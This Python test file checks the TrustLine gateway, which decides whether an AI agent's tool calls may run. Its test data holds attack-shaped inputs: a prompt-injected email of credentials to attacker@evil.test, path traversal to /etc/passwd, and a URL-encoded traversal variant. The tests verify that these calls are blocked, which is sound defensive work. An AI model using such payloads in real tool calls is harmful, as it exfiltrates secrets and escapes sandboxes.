"""Deterministic unit tests for the TrustLine gateway policy oracle.

Every test that claims to validate the execution boundary calls
`env.execute(call)` directly and unconditionally -- never gated behind
`if decision.verdict == ALLOW`, whether that gate is in the test or copied
from the runner. A test that never attempts execution cannot prove the
boundary blocks anything; it only proves the test author chose not to try.
"""

from __future__ import annotations

import pytest

from trustline_bench import gateway
from trustline_bench.audit import AuditLog
from trustline_bench.mock_tools import MockToolEnvironment, ProhibitedToolInvoked, UnauthorizedExecution, _fingerprint
from trustline_bench.models import Authorization, GatewayVerdict, ToolCall, ToolCallOrigin


def test_benign_allowlisted_call_is_allowed_and_executes():
    env = MockToolEnvironment()
    call = ToolCall(tool="list_calendar_events", args={}, origin=ToolCallOrigin.USER_INSTRUCTION)

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.ALLOW

    result = env.execute(call)
    assert result.executed is True
    assert "list_calendar_events" in env.call_ledger


# ---------------------------------------------------------------------------
# Explicitly prohibited tools: gateway-level denial vs. handler-level
# failsafe. These are two different layers and need two different tests --
# collapsing them into one (as the previous version of this file did) means
# only the outer layer is ever actually exercised.
# ---------------------------------------------------------------------------


def test_explicitly_prohibited_tool_is_denied_by_gateway():
    call = ToolCall(
        tool="wire_transfer",
        args={"destination_account": "ACC-EXTERNAL-9999", "amount": 10000},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )
    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "explicitly_prohibited_tool"


@pytest.mark.parametrize(
    ("tool", "args"),
    [
        ("wire_transfer", {"destination_account": "ACC-EXTERNAL-9999", "amount": 10000}),
        ("delete_account", {"account_id": "ACC-1"}),
    ],
)
def test_prohibited_tool_cannot_execute_via_direct_env_call(tool, args):
    """Calls env.execute() directly, unconditionally -- bypassing the
    runner and any pre-check -- to prove the environment itself (not just
    the gateway's reported verdict) blocks the call."""
    env = MockToolEnvironment()
    call = ToolCall(tool=tool, args=args, origin=ToolCallOrigin.USER_INSTRUCTION)

    result = env.execute(call)

    assert result.executed is False
    assert tool not in env.call_ledger
    assert env.sent_emails == []
    assert env.transfers == []
    assert env.public_posts == []


@pytest.mark.parametrize("tool", ["wire_transfer", "delete_account"])
def test_prohibited_tool_handler_level_failsafe_blocks_direct_bypass_with_no_authorization(tool):
    """Calling the handler directly with no authorization at all raises
    UnauthorizedExecution -- the same Phase 4 boundary every other
    handler now has."""
    env = MockToolEnvironment()
    handler = getattr(env, f"_{tool}")

    with pytest.raises(UnauthorizedExecution):
        handler(None, {})

    assert tool not in env.call_ledger


@pytest.mark.parametrize("tool", ["wire_transfer", "delete_account"])
def test_prohibited_tool_still_refuses_even_with_a_hypothetically_valid_authorization(tool):
    """Defense in depth: even if a caller somehow obtained a technically
    valid, matching Authorization for wire_transfer/delete_account (which
    gateway.evaluate() would never actually issue, since these tools are
    unconditionally denied before ALLOW is ever reached), the handler
    still refuses via ProhibitedToolInvoked. Two independent reasons it
    can't run, not one -- this simulates the hypothetical by registering
    the token directly, bypassing the normal issuance path on purpose."""
    env = MockToolEnvironment()
    token = "hypothetically-leaked-valid-token"
    env._issued_tokens.add(token)
    authorization = Authorization(tool=tool, args_fingerprint=_fingerprint({}), token=token)
    handler = getattr(env, f"_{tool}")

    with pytest.raises(ProhibitedToolInvoked):
        handler(authorization, {})

    assert tool not in env.call_ledger


# ---------------------------------------------------------------------------
# Prompt injection via untrusted tool output (taint check)
# ---------------------------------------------------------------------------


def test_prompt_injection_via_untrusted_tool_output_cannot_execute():
    env = MockToolEnvironment()
    call = ToolCall(
        tool="send_email",
        args={"recipient": "attacker@evil.test", "subject": "creds", "body": "..."},
        origin=ToolCallOrigin.UNTRUSTED_TOOL_OUTPUT,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "tainted_source_blocked"

    result = env.execute(call)
    assert result.executed is False
    assert env.sent_emails == []
    assert env.call_ledger == []


def test_same_sensitive_tool_allowed_and_executes_when_user_initiated():
    """Sanity check that the taint rule is about origin, not the tool
    itself, and that it does not overblock a legitimate call: the call
    must actually execute, not just receive an ALLOW verdict."""
    env = MockToolEnvironment()
    call = ToolCall(
        tool="send_email",
        args={"recipient": "someone@trustline-corp.test", "subject": "hi", "body": "..."},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )
    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.ALLOW

    result = env.execute(call)
    assert result.executed is True
    assert env.sent_emails == [{"recipient": "someone@trustline-corp.test", "subject": "hi", "body": "..."}]


def test_system_origin_is_explicitly_trusted_for_sensitive_tools():
    """Documents the explicit policy decision: a SYSTEM-origin call is
    trust-equivalent to USER_INSTRUCTION (operator-authored, not
    attacker-reachable the way tool output is), not auto-denied and not
    trusted merely by accident of omission. See gateway.TRUSTED_ORIGINS."""
    env = MockToolEnvironment()
    call = ToolCall(
        tool="send_email",
        args={"recipient": "someone@trustline-corp.test", "subject": "hi", "body": "..."},
        origin=ToolCallOrigin.SYSTEM,
    )
    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.ALLOW

    result = env.execute(call)
    assert result.executed is True


def test_unrecognized_origin_value_fails_closed_for_sensitive_tools():
    """gateway.TRUSTED_ORIGINS is an allowlist, not a denylist of just
    UNTRUSTED_TOOL_OUTPUT -- so an origin value that isn't a recognized
    trusted origin must be denied for sensitive tools, including values
    that don't correspond to any defined ToolCallOrigin member. ToolCall
    doesn't validate `origin` at construction (it's a plain dataclass
    field), so a caller could assign an arbitrary string directly; this
    proves that path still fails closed rather than silently trusting it."""
    env = MockToolEnvironment()
    call = ToolCall(tool="send_email", args={"recipient": "x@trustline-corp.test"}, origin="some_future_origin")

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "tainted_source_blocked"

    result = env.execute(call)
    assert result.executed is False
    assert env.sent_emails == []


# ---------------------------------------------------------------------------
# Destination / argument validation: transfer_funds
# ---------------------------------------------------------------------------


def test_destination_validation_blocks_non_allowlisted_transfer_account():
    env = MockToolEnvironment()
    call = ToolCall(
        tool="transfer_funds",
        args={"destination_account": "ACC-UNKNOWN-4242", "amount": 200},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "destination_not_allowlisted"

    result = env.execute(call)
    assert result.executed is False
    assert env.transfers == []


def test_argument_validation_blocks_transfer_over_max_amount():
    env = MockToolEnvironment()
    call = ToolCall(
        tool="transfer_funds",
        args={"destination_account": "ACC-INTERNAL-0001", "amount": 999999},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "argument_validation_failed"

    result = env.execute(call)
    assert result.executed is False
    assert env.transfers == []


@pytest.mark.parametrize(
    "amount",
    [-1, 0, True, False, float("nan"), float("inf"), float("-inf"), "500", None, [500]],
)
def test_invalid_transfer_amounts_are_denied_and_never_execute(amount):
    """Covers negative, zero, booleans (bool is an int subclass in Python),
    NaN, +/-infinity, and non-numeric types (str, None, list), per the
    audit's explicit request to check all of these, not just negative."""
    env = MockToolEnvironment()
    call = ToolCall(
        tool="transfer_funds",
        args={"destination_account": "ACC-INTERNAL-0001", "amount": amount},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "argument_validation_failed"

    result = env.execute(call)
    assert result.executed is False
    assert env.transfers == []


def test_transfer_amount_at_maximum_is_allowed_and_executes():
    env = MockToolEnvironment()
    call = ToolCall(
        tool="transfer_funds",
        args={"destination_account": "ACC-INTERNAL-0001", "amount": 500},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.ALLOW

    result = env.execute(call)
    assert result.executed is True
    assert env.transfers == [{"destination_account": "ACC-INTERNAL-0001", "amount": 500}]


# ---------------------------------------------------------------------------
# Sandbox path validation: read_file / write_file
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("tool", ["read_file", "write_file"])
def test_path_traversal_is_blocked_and_never_executes(tool):
    env = MockToolEnvironment()
    call = ToolCall(
        tool=tool,
        args={"path": "/sandbox/../etc/passwd", "content": "pwned"},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "path_traversal_blocked"

    fs_before = dict(env.fake_fs)
    result = env.execute(call)
    assert result.executed is False
    assert env.fake_fs == fs_before


@pytest.mark.parametrize("tool", ["read_file", "write_file"])
def test_path_outside_sandbox_is_blocked_and_never_executes(tool):
    env = MockToolEnvironment()
    call = ToolCall(
        tool=tool,
        args={"path": "/etc/passwd", "content": "pwned"},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "path_outside_sandbox"

    fs_before = dict(env.fake_fs)
    result = env.execute(call)
    assert result.executed is False
    assert env.fake_fs == fs_before


# ---------------------------------------------------------------------------
# post_public_message: channel allowlist (previously had none at all)
# ---------------------------------------------------------------------------


def test_post_public_message_requires_allowlisted_channel():
    env = MockToolEnvironment()
    call = ToolCall(
        tool="post_public_message",
        args={"channel": "random-public-forum", "text": "hi"},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "destination_not_allowlisted"

    result = env.execute(call)
    assert result.executed is False
    assert env.public_posts == []


def test_post_public_message_allowed_and_executes_on_authorized_channel():
    env = MockToolEnvironment()
    call = ToolCall(
        tool="post_public_message",
        args={"channel": "company-announcements", "text": "hi"},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.ALLOW

    result = env.execute(call)
    assert result.executed is True
    assert env.public_posts == [{"channel": "company-announcements", "text": "hi"}]


def test_post_public_message_blocked_by_taint_check_even_on_authorized_channel():
    """The taint check runs before argument validation, so an authorized
    channel does not rescue an untrusted-origin call."""
    env = MockToolEnvironment()
    call = ToolCall(
        tool="post_public_message",
        args={"channel": "company-announcements", "text": "injected"},
        origin=ToolCallOrigin.UNTRUSTED_TOOL_OUTPUT,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "tainted_source_blocked"

    result = env.execute(call)
    assert result.executed is False
    assert env.public_posts == []


# ---------------------------------------------------------------------------
# Unknown tools and malformed arguments
# ---------------------------------------------------------------------------


def test_unknown_tool_is_denied_and_never_executes():
    env = MockToolEnvironment()
    call = ToolCall(tool="launch_missiles", args={}, origin=ToolCallOrigin.USER_INSTRUCTION)

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "unknown_tool"

    result = env.execute(call)
    assert result.executed is False
    assert env.call_ledger == []


@pytest.mark.parametrize("malformed_args", [None, "not-a-dict", ["also", "not", "a", "dict"], 42])
def test_non_dict_arguments_are_rejected_safely_not_crashed(malformed_args):
    """Malformed arguments must be denied, not raise an exception that
    would crash the caller or (worse) skip straight past validation."""
    call = ToolCall(tool="send_email", args=malformed_args, origin=ToolCallOrigin.USER_INSTRUCTION)

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "malformed_arguments"

    env = MockToolEnvironment()
    result = env.execute(call)  # must not raise
    assert result.executed is False
    assert env.sent_emails == []


@pytest.mark.parametrize(
    ("tool", "reason_code"),
    [
        ("send_email", "destination_not_allowlisted"),
        ("transfer_funds", "destination_not_allowlisted"),
        ("post_public_message", "destination_not_allowlisted"),
        ("read_file", "path_outside_sandbox"),
    ],
)
def test_missing_required_argument_keys_deny_rather_than_crash(tool, reason_code):
    """Calling with an empty but valid dict (missing every tool-specific
    key) must deny for a tool-specific reason, not raise KeyError."""
    env = MockToolEnvironment()
    call = ToolCall(tool=tool, args={}, origin=ToolCallOrigin.USER_INSTRUCTION)

    decision = gateway.evaluate(call)  # must not raise
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == reason_code

    result = env.execute(call)  # must not raise
    assert result.executed is False


# ---------------------------------------------------------------------------
# Audit log integrity
# ---------------------------------------------------------------------------


def test_audit_log_is_valid_before_tamper_and_invalid_after():
    log = AuditLog()
    log.append("t0", {"event": "a"})
    log.append("t1", {"event": "b"})
    log.append("t2", {"event": "c"})

    valid_before, _ = log.verify()
    assert valid_before is True

    log.entries[1]["event"]["event"] = "tampered"

    valid_after, bad_index = log.verify()
    assert valid_after is False
    assert bad_index == 1


# ---------------------------------------------------------------------------
# Consistency between the gateway's own decision and what execute() does.
# This is the regression test for the bug class found during the audit:
# a runner or test that pre-gates on `if decision.verdict == ALLOW` before
# calling execute() never actually proves the two agree, because it never
# calls execute() at all on the deny path. This test calls execute()
# unconditionally for every case and cross-checks it against evaluate().
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("tool", "args", "origin", "expect_allow"),
    [
        ("list_calendar_events", {}, ToolCallOrigin.USER_INSTRUCTION, True),
        ("wire_transfer", {"destination_account": "ACC-EXTERNAL-9999", "amount": 1}, ToolCallOrigin.USER_INSTRUCTION, False),
        ("delete_account", {"account_id": "x"}, ToolCallOrigin.USER_INSTRUCTION, False),
        (
            "send_email",
            {"recipient": "attacker@evil.test"},
            ToolCallOrigin.UNTRUSTED_TOOL_OUTPUT,
            False,
        ),
        (
            "send_email",
            {"recipient": "ok@trustline-corp.test"},
            ToolCallOrigin.USER_INSTRUCTION,
            True,
        ),
        (
            "transfer_funds",
            {"destination_account": "ACC-UNKNOWN", "amount": 1},
            ToolCallOrigin.USER_INSTRUCTION,
            False,
        ),
        (
            "transfer_funds",
            {"destination_account": "ACC-INTERNAL-0001", "amount": 1},
            ToolCallOrigin.USER_INSTRUCTION,
            True,
        ),
        ("read_file", {"path": "/etc/passwd"}, ToolCallOrigin.USER_INSTRUCTION, False),
        ("read_file", {"path": "/sandbox/notes.txt"}, ToolCallOrigin.USER_INSTRUCTION, True),
        ("launch_missiles", {}, ToolCallOrigin.USER_INSTRUCTION, False),
    ],
)
def test_gateway_decision_and_execute_always_agree(tool, args, origin, expect_allow):
    env = MockToolEnvironment()
    call = ToolCall(tool=tool, args=args, origin=origin)

    decision = gateway.evaluate(call)
    result = env.execute(call)

    assert (decision.verdict == GatewayVerdict.ALLOW) == expect_allow
    assert result.executed == expect_allow
    assert (decision.verdict == GatewayVerdict.ALLOW) == result.executed


# ---------------------------------------------------------------------------
# Policy generalization: boundary values and adversarial input shapes.
#
# Every allowlist check in gateway.py (_validate_args) is an EXACT string
# match against a frozenset. That is the intended semantic -- deliberately
# NOT case- or whitespace-normalized -- because normalizing before matching
# is itself a place a bypass could be introduced (e.g. normalizing in a way
# that makes two visually-different destinations compare equal). The tests
# below prove that semantic holds, rather than assuming it. See README's
# "Known limitations" for the real-world tradeoff this creates (a
# production system would likely want case-insensitive email-domain
# matching, at minimum, to avoid overblocking a legitimately different-case
# address -- intentionally not implemented here, to avoid adding
# normalization logic in the same pass as testing for bypasses through it).
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("tool", "args"),
    [
        ("send_email", {"recipient": "someone@TRUSTLINE-CORP.TEST"}),
        ("send_email", {"recipient": "someone@trustline-corp.test "}),  # trailing space in domain
        ("send_email", {"recipient": "someone@ trustline-corp.test"}),  # leading space IN the domain
        # Note: a leading/trailing space in the LOCAL part (e.g.
        # " someone@trustline-corp.test") is correctly allowed by this
        # gateway -- only the domain is allowlisted, the local part isn't
        # validated at all, so whitespace there doesn't change the
        # extracted domain. That is not tested here as a deny case because
        # it isn't one; see the domain-only design note in README.
        ("transfer_funds", {"destination_account": "ACC-INTERNAL-0001 ", "amount": 10}),  # trailing space
        ("transfer_funds", {"destination_account": "acc-internal-0001", "amount": 10}),  # lowercase
        ("transfer_funds", {"destination_account": "ACC-INTERNAL-00010", "amount": 10}),  # extra digit
        ("post_public_message", {"channel": "Company-Announcements", "text": "x"}),  # case-different
        ("post_public_message", {"channel": "company-announcements ", "text": "x"}),  # trailing space
    ],
)
def test_destination_allowlists_require_exact_match_not_lookalikes(tool, args):
    """A value that merely resembles an allowlisted one -- different case,
    extra whitespace, or an extra character -- must be denied, not
    normalized into a match. This is the intended semantic, tested
    explicitly rather than left as an assumption."""
    env = MockToolEnvironment()
    call = ToolCall(tool=tool, args=args, origin=ToolCallOrigin.USER_INSTRUCTION)

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "destination_not_allowlisted"

    result = env.execute(call)
    assert result.executed is False


@pytest.mark.parametrize(
    ("tool", "args"),
    [
        ("send_email", {"recipient": {"nested": "dict-not-a-string"}}),
        ("send_email", {"recipient": ["list", "not", "a", "string"]}),
        ("transfer_funds", {"destination_account": {"nested": "dict"}, "amount": 10}),
        ("post_public_message", {"channel": {"nested": "dict"}, "text": "x"}),
    ],
)
def test_unexpected_nested_data_in_a_string_field_is_denied_not_crashed(tool, args):
    """A field that is normally a string but arrives as a dict/list must be
    denied safely (it will never match an allowlist of strings), not raise
    inside the gateway or the handler."""
    env = MockToolEnvironment()
    call = ToolCall(tool=tool, args=args, origin=ToolCallOrigin.USER_INSTRUCTION)

    decision = gateway.evaluate(call)  # must not raise
    assert decision.verdict == GatewayVerdict.DENY

    result = env.execute(call)  # must not raise
    assert result.executed is False


@pytest.mark.parametrize(
    "amount",
    [{"nested": "dict"}, [500], (500,), b"500"],
)
def test_non_numeric_container_amounts_are_denied_not_crashed(amount):
    """Extends the existing numeric-edge-case coverage (negative, zero,
    bool, NaN, +/-inf, str, None, list) with container/bytes types, which
    exercise a different code path (isinstance checks against dict/tuple/
    bytes rather than just "not a number")."""
    env = MockToolEnvironment()
    call = ToolCall(
        tool="transfer_funds",
        args={"destination_account": "ACC-INTERNAL-0001", "amount": amount},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "argument_validation_failed"

    result = env.execute(call)
    assert result.executed is False


def test_url_encoded_traversal_segment_is_not_a_real_bypass_in_the_mock_fs():
    """Documents a real limitation rather than silently passing: this mock
    environment does zero URL-decoding or real path resolution, so a
    literal '%2e%2e' segment does NOT contain the ".." the traversal check
    looks for, and the gateway correctly has nothing to deny -- it ALLOWS
    the read. But because fake_fs is a plain dict keyed by the literal
    path string (not a resolved filesystem), there is no entry under that
    literal key, so the read returns nothing and no real sandbox escape
    occurs either. This is a property of the mock being too simple to have
    the vulnerability, not evidence that a real integration handling
    encoded paths would be safe -- see README's "Known limitations"."""
    env = MockToolEnvironment()
    call = ToolCall(
        tool="read_file",
        args={"path": "/sandbox/%2e%2e/etc/passwd"},
        origin=ToolCallOrigin.USER_INSTRUCTION,
    )

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.ALLOW  # no literal ".." segment to catch

    result = env.execute(call)
    assert result.executed is True  # the read itself "succeeds"...
    assert result.output == ""  # ...but returns nothing: no such literal key exists


def test_invalid_origin_passed_through_runner_style_raw_string_fails_closed():
    """Mirrors how runner.py now constructs ToolCall: the origin is passed
    as a raw string, not forced through ToolCallOrigin(...). Confirms that
    path still fails closed for a sensitive tool, matching
    test_unrecognized_origin_value_fails_closed_for_sensitive_tools above
    but phrased against the exact construction runner.py uses."""
    env = MockToolEnvironment()
    call = ToolCall(tool="send_email", args={"recipient": "x@trustline-corp.test"}, origin="legacy_plugin")

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == "tainted_source_blocked"

    result = env.execute(call)
    assert result.executed is False


# ---------------------------------------------------------------------------
# Phase 3 audit: a trusted origin clears the TAINT check only. It must not
# grant a blanket exemption from destination/amount validation downstream
# -- found to be true by inspection, but untested anywhere until now.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("tool", "args", "expected_reason"),
    [
        ("send_email", {"recipient": "someone@external-unauthorized.test"}, "destination_not_allowlisted"),
        (
            "transfer_funds",
            {"destination_account": "ACC-INTERNAL-0001", "amount": 999999},
            "argument_validation_failed",
        ),
        (
            "post_public_message",
            {"channel": "not-a-real-channel", "text": "x"},
            "destination_not_allowlisted",
        ),
    ],
)
def test_trusted_origin_does_not_exempt_from_destination_or_amount_validation(tool, args, expected_reason):
    """SYSTEM (and USER_INSTRUCTION) being trusted means the taint check
    passes -- it does not mean the call is unconditionally allowed. A
    trusted-origin call to an invalid destination or amount must still be
    denied by the same downstream validation a tainted call would hit."""
    env = MockToolEnvironment()
    call = ToolCall(tool=tool, args=args, origin=ToolCallOrigin.SYSTEM)

    decision = gateway.evaluate(call)
    assert decision.verdict == GatewayVerdict.DENY
    assert decision.reason_code == expected_reason

    result = env.execute(call)
    assert result.executed is False
